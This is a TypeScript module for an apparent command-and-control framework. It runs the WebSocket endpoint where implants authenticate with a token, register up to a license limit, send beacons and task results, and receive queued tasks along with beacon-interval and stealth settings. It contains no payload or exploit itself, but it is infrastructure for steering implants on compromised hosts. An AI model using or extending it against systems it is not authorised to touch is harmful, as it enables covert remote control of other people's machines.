import { WebSocketServer, WebSocket } from "ws";
import type { Server } from "node:http";
import type { ReachRegistry } from "./reach.js";
import type { TaskQueue } from "./taskQueue.js";
import type { BroadcastFn } from "./ws.js";
import type { ImplantHeartbeat, BeaconResponse } from "../types.js";
import { emitAlert } from "../../guard/alert.js";
import { logAudit } from "../../audit.js";
import { analyzeTaskResult } from "./analysis.js";
import { getLimits } from "../../license.js";

/**
 * Attach an implant-facing WebSocket server.
 * Implants connect at `/api/v1/implant/ws`, authenticate with the implant token,
 * and exchange JSON frames for beaconing.
 */
export function createImplantWsServer(
  httpServer: Server,
  registry: ReachRegistry,
  taskQueue: TaskQueue,
  implantToken: string,
  broadcast?: BroadcastFn,
): void {
  const wss = new WebSocketServer({ server: httpServer, path: "/api/v1/implant/ws" });

  wss.on("connection", (ws, _req) => {
    let authed = false;
    let implantId = "";

    const authTimer = setTimeout(() => {
      if (!authed) {
        ws.close(4001, "auth timeout");
      }
    }, 10000);

    ws.on("message", (raw) => {
      try {
        const msg = JSON.parse(raw.toString());

        // Handle auth
        if (!authed) {
          if (msg.type === "auth" && msg.token === implantToken) {
            authed = true;
            clearTimeout(authTimer);
            ws.send(JSON.stringify({ status: "ok" }));
            return;
          }
          ws.close(4001, "invalid token");
          return;
        }

        // Handle heartbeat
        const hb = msg as ImplantHeartbeat;
        implantId = hb.implantId;

        // Auto-register if first beacon
        let implant = registry.get(hb.implantId);
        if (!implant) {
          const limits = getLimits();
          const activeCount = registry.summary().active;
          if (activeCount >= limits.maxImplants) {
            ws.send(JSON.stringify({ error: `license limit reached: ${limits.maxImplants}` }));
            return;
          }
          registry.register({
            id: hb.implantId,
            name: hb.implantId,
            targetHost: "unknown",
            version: "1.0",
          });
          emitAlert("implant", `${hb.implantId} registered via WS`, "info");
          logAudit({ timestamp: new Date().toISOString(), sessionId: "c2", action: "implant.register", target: hb.implantId, success: true, details: "websocket" });
          broadcast?.({ type: "implant_registered", timestamp: new Date().toISOString(), data: { implantId: hb.implantId, channel: "ws" } });
        } else {
          broadcast?.({ type: "implant_beacon", timestamp: new Date().toISOString(), data: { implantId: hb.implantId, status: hb.status, channel: "ws" } });
        }

        const config = registry.heartbeat(hb.implantId, hb);
        if (!config) {
          ws.send(JSON.stringify({ error: "implant not found" }));
          return;
        }

        // Acknowledge pending results
        for (const pr of hb.pendingResults ?? []) {
          const updated = taskQueue.complete(pr.taskId, { success: pr.success, data: pr.data, error: pr.error });
          const label = pr.success ? "completed" : "failed";
          emitAlert("task", `${pr.taskId.slice(0, 8)} ${label}`, pr.success ? "info" : "warning");
          logAudit({ timestamp: new Date().toISOString(), sessionId: "c2", action: `task.${label}`, target: pr.taskId, success: pr.success, details: pr.error });
          broadcast?.({
            type: pr.success ? "task_completed" : "task_failed",
            timestamp: new Date().toISOString(),
            data: { taskId: pr.taskId, implantId: hb.implantId, success: pr.success, error: pr.error },
          });
          if (pr.success && updated) {
            analyzeTaskResult(updated).catch(() => {});
          }
        }

        // Poll for new tasks
        const taskAssignments = taskQueue.poll(hb.implantId);

        const response: BeaconResponse = {
          ackedResults: hb.pendingResults?.map((r) => r.taskId) ?? [],
          tasks: taskAssignments,
          config: {
            beaconInterval: config.beaconInterval,
            stealthConfig: config.stealthConfig,
          },
          command: "none",
        };

        ws.send(JSON.stringify(response));
      } catch (err) {
        // Ignore malformed messages
      }
    });

    ws.on("close", () => {
      if (implantId) {
        broadcast?.({ type: "implant_beacon", timestamp: new Date().toISOString(), data: { implantId, status: "disconnected", channel: "ws" } });
      }
    });
  });
}
